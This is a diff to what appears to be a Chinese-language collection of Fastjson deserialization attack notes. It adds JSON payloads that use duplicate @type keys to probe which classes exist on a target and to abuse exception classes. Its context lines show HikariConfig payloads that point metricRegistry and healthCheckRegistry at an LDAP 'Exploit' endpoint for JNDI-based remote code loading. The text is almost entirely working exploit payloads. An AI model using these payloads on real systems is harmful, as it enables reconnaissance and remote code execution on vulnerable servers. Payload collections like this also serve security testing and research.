@@ -749,6 +749,20 @@ https://b1ue.cn/archives/348.html   **使用Throwable子类造成信息泄露** 
 
 
 
+**通过@tpye去判断存在的类**
+```json
+{
+"@type":"java.lang.AutoCloseable",
+"@type":"xxx.xxx.xxx"
+}
+```
+**异常类**
+
+```json
+{"@type":"java.lang.Exception","@type":"com.zfirm.exception.MyException"}
+```
+
+
 ```java
 {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
 {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
